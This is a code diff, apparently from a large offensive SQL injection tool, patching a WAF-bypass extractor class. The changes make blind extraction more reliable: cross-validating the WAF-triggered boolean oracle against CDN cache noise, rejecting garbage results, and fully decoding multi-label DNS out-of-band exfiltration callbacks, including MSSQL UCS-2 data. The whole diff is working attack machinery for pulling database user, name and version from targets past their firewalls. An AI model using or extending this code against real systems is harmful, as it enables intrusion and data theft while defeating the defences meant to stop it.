@@ -157432,24 +157432,83 @@ class NovelWAFBypassExtractor:
                     async def _waf_eval(cond):
                         payload = WAFWeaponizationOracle.build_payload(cond, dbms, trigger_idx)
                         fp, _ = await send_fn(payload)
+                        # BUG-WAFEVAL-NONE FIX: when fp is None (network error or WAF hard-block),
+                        # getattr(None, "status_code", 0) returns 0, and 0==true_status may be
+                        # True or False depending on calibration.  A blocked probe must not be
+                        # silently treated as a definite True or False; return None so
+                        # _bitwise_extract_with_oracle's None-handling logic aborts cleanly.
+                        if fp is None:
+                            return None
                         return getattr(fp, "status_code", 0) == true_status
 
-                    # Extract via bitwise using WAF oracle
-                    for label, query in [("user", _user_q), ("database", _db_q), ("version", _version_q)]:
-                        q = query.get(dbms, "SELECT 1")
-                        val = await asyncio.wait_for(
-                            _bitwise_extract_with_oracle(_waf_eval, q, dbms, delay, label),
-                            timeout=120)
-                        if val:
-                            results[label] = val
-                            print("[+] [Novel]  WAF-weaponized %s = %s" % (label, val,))
-                        await asyncio.sleep(delay)
+                    # BUG-PATH-INJECTION-CDN-WAFWEAPON FIX: For PATH injection surfaces the
+                    # WAF weaponization payload is embedded in the URL path.  CDN edge nodes
+                    # cache URL paths independently, so two different bit-probe URLs (different
+                    # SQL ORD mask values → different URL paths) can return cached 400/404
+                    # responses whose statuses correlate with CDN cache state rather than SQL
+                    # execution.  Calibration succeeded because the calibration URLs happened
+                    # to have different cache states (true_status=400, false_status=404), but
+                    # during extraction individual bit-probe URLs independently hit or miss the
+                    # cache, producing random True/False results → garbage Unicode (observed:
+                    # U+23103, U+C6808, U+91062, U+64086 in the production log).
+                    # Fix: run a post-calibration cross-validation with 3 independent True/False
+                    # probe pairs using the calibrated oracle.  If the oracle cannot reliably
+                    # discriminate (≥2 of 3 pairs agree), abort for this surface to avoid garbage.
+                    _is_path_injection = (
+                        "path" in str(getattr(detection_result, "param", "") or "").lower()
+                        or "path" in str(getattr(config, "injection_type", "") or "").lower()
+                    )
+                    _wafweapon_valid = True
+                    if _is_path_injection:
+                        print("[+] [Novel]  PATH injection surface: running oracle cross-validation "
+                              "(CDN cache interference check)", flush=True)
+                        _cross_agree = 0
+                        _cross_total = 3
+                        for _cv_i in range(_cross_total):
+                            try:
+                                _cv_true  = await asyncio.wait_for(_waf_eval(_novel_true_cond),  timeout=10)
+                                _cv_false = await asyncio.wait_for(_waf_eval(_novel_false_cond), timeout=10)
+                                if _cv_true is not None and _cv_false is not None and _cv_true != _cv_false:
+                                    _cross_agree += 1
+                                await asyncio.sleep(delay * 0.5)
+                            except Exception:
+                                pass
+                        if _cross_agree < 2:
+                            _wafweapon_valid = False
+                            print(f"[+] [Novel]  WAF weaponization oracle FAILED cross-validation "
+                                  f"({_cross_agree}/{_cross_total} pairs discriminated) — "
+                                  f"CDN cache interference likely on PATH injection surface; skipping",
+                                  flush=True)
+                        else:
+                            print(f"[+] [Novel]  Oracle cross-validation passed ({_cross_agree}/{_cross_total})",
+                                  flush=True)
 
-                    # Validate: reject single-char results (likely inverted oracle)
-                    if results:
-                        results = {k: v for k, v in results.items() if len(str(v)) >= 3}
-                    if results:
-                        return results
+                    if _wafweapon_valid:
+                        # Extract via bitwise using WAF oracle
+                        for label, query in [("user", _user_q), ("database", _db_q), ("version", _version_q)]:
+                            q = query.get(dbms, "SELECT 1")
+                            val = await asyncio.wait_for(
+                                _bitwise_extract_with_oracle(_waf_eval, q, dbms, delay, label),
+                                timeout=120)
+                            if val:
+                                results[label] = val
+                                print("[+] [Novel]  WAF-weaponized %s = %s" % (label, val,))
+                            await asyncio.sleep(delay)
+
+                        # BUG-NOVEL1-VALIDATION FIX: validate extracted values for ASCII
+                        # printability, not just minimum length.  The len>=3 check passes garbage
+                        # Unicode (e.g. '𣄃\U000c6808\U00091062\U00064086', length=4) produced when
+                        # CDN cache interference causes all oracle bits to evaluate incorrectly
+                        # (assembled char_val > U+FFFF satisfies 32 <= char_val <= 1114111 guard in
+                        # _bitwise_extract_with_oracle but is not real database data).
+                        # Fix: require all chars to be ASCII printable (0x20–0x7E), matching the
+                        # correct validation already used by Technique 3 (resource bomb).
+                        if results:
+                            results = {k: v for k, v in results.items()
+                                       if len(str(v)) >= 3
+                                       and all(32 <= ord(c) <= 126 for c in str(v))}
+                        if results:
+                            return results
             else:
                 print("[+] [Novel]  No WAF trigger produced different response")
         except Exception as e:
@@ -157502,10 +157561,16 @@ class NovelWAFBypassExtractor:
                         print("[+] [Novel]  Micro-timing %s = %s" % (label, val,))
                     await asyncio.sleep(delay)
 
-                # Validate: reject single-char and garbage results
+                # Validate: reject single-char, garbage Unicode, and repeated-char results.
+                # BUG-MICRO-TIMING-VALIDATION FIX: len>=3 and len(set)>=3 do not prevent
+                # non-ASCII garbage (e.g. '𣄃𣄃𣄃𣄃' has length 4 and set size 1 — caught by
+                # len(set)>=3; but '𣄃\U000c6808\U00091062\U00064086' has set size 4 — passes).
+                # Add ASCII printability check to match Novel-1 and Technique 3 validation.
                 if results:
                     results = {k: v for k, v in results.items()
-                               if len(str(v)) >= 3 and len(set(str(v))) >= 3}
+                               if len(str(v)) >= 3
+                               and len(set(str(v))) >= 3
+                               and all(32 <= ord(c) <= 126 for c in str(v))}
                 if results:
                     return results
             else:
@@ -157600,10 +157665,10 @@ class NovelWAFBypassExtractor:
                 if _t4_fired_count > 0 and _t4_oob_server:
                     print("[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...")
                     try:
-                        import time as _t4_time
-                        _t4_deadline = _t4_time.monotonic() + 30.0
+                        # BUG-T4-INLINE-IMPORT FIX: use module-level time and json
+                        _t4_deadline = time.monotonic() + 30.0
                         _t4_hdrs = {"Authorization": f"Bearer {_t4_oob_token}"} if _t4_oob_token else {}
-                        while _t4_time.monotonic() < _t4_deadline:
+                        while time.monotonic() < _t4_deadline:
                             try:
                                 _t4_reg = getattr(config, "_oob_registered_token", None) or _t4_oob_token or "sqr"
                                 _t4_pfp = await engine.send(
@@ -157611,23 +157676,50 @@ class NovelWAFBypassExtractor:
                                     params={"id": _t4_reg, "secret": _t4_reg},
                                     headers=_t4_hdrs)
                                 if _t4_pfp and getattr(_t4_pfp, "body", None):
-                                    import json as _t4_json
                                     _t4_raw = _t4_pfp.body
                                     if isinstance(_t4_raw, bytes):
                                         _t4_raw = _t4_raw.decode("utf-8", errors="replace")
-                                    _t4_data = _t4_json.loads(_t4_raw)
+                                    _t4_data = json.loads(_t4_raw)
                                     if _t4_data.get("data"):
                                         for _t4_item in _t4_data["data"]:
                                             _t4_sub = (_t4_item if isinstance(_t4_item, str)
                                                        else (_t4_item.get("full-id") or _t4_item.get("subdomain") or ""))
                                             print("[+] [Novel] Technique 4 OOB callback: %s" % (_t4_sub[:80],))
-                                            _t4_hex = _t4_sub.split(".")[0] if _t4_sub else ""
-                                            if len(_t4_hex) > 4 and all(c in "0123456789abcdef" for c in _t4_hex.lower()):
+                                            # BUG-T4-SINGLE-LABEL FIX: DNS labels are ≤63 chars (≤31 bytes).
+                                            # Values >31 bytes are chunked across multiple consecutive hex labels.
+                                            # The old code only decoded the FIRST label, losing all subsequent chunks.
+                                            # Fix: collect ALL leading consecutive hex-only labels and concatenate
+                                            # (mirrors DNSExfil.extract_value chunking logic at L173905).
+                                            _t4_parts = _t4_sub.split(".") if _t4_sub else []
+                                            _t4_hex_labels = []
+                                            for _t4_p in _t4_parts:
+                                                _t4_pl = _t4_p.lower()
+                                                if len(_t4_pl) >= 2 and all(c in "0123456789abcdef" for c in _t4_pl):
+                                                    _t4_hex_labels.append(_t4_pl)
+                                                else:
+                                                    break
+                                            _t4_hex = "".join(_t4_hex_labels)
+                                            if len(_t4_hex) > 4:
                                                 try:
-                                                    _t4_val = bytes.fromhex(_t4_hex.lower()).decode("utf-8", errors="replace")
-                                                    results["oob_dns"] = _t4_val
-                                                    print("[+] [Novel] Technique 4 OOB data: %s" % (_t4_val[:60],))
-                                                    return results
+                                                    _t4_raw_b = bytes.fromhex(_t4_hex)
+                                                    # Handle MSSQL UCS-2 LE: every odd byte is 0x00
+                                                    _t4_len = len(_t4_raw_b)
+                                                    _t4_is_ucs2 = (
+                                                        _t4_len >= 4 and _t4_len % 2 == 0
+                                                        and all(_t4_raw_b[i] == 0 for i in range(1, _t4_len, 2))
+                                                        and any(_t4_raw_b[i] != 0 for i in range(0, _t4_len, 2))
+                                                    )
+                                                    if _t4_is_ucs2:
+                                                        _t4_val = _t4_raw_b.decode("utf-16-le", errors="replace")
+                                                    else:
+                                                        _t4_val = _t4_raw_b.decode("utf-8", errors="replace")
+                                                    _t4_val = _t4_val.replace("\x00", "")
+                                                    # Validate: at least 3 chars, all printable ASCII
+                                                    if (len(_t4_val) >= 3
+                                                            and all(32 <= ord(c) <= 126 for c in _t4_val)):
+                                                        results["oob_dns"] = _t4_val
+                                                        print("[+] [Novel] Technique 4 OOB data: %s" % (_t4_val[:60],))
+                                                        return results
                                                 except (ValueError, UnicodeDecodeError):
                                                     pass
                             except Exception:
@@ -157795,7 +157887,12 @@ class NovelWAFBypassExtractor:
                             results[label] = val
                             print("[+] [Novel]  Error-type %s = %s" % (label, val,))
                         await asyncio.sleep(delay)
-                    results = {k: v for k, v in results.items() if len(str(v)) >= 3}
+                    # BUG-ERRTYPE-VALIDATION FIX: same printability guard as Novel-1.
+                    # len>=3 alone accepts garbage Unicode assembled from an oracle that
+                    # cannot distinguish True from False (WAF homogenises all responses).
+                    results = {k: v for k, v in results.items()
+                               if len(str(v)) >= 3
+                               and all(32 <= ord(c) <= 126 for c in str(v))}
                     if results: return results
             else:
                 print("[+] [Novel]  No error type produces different response")
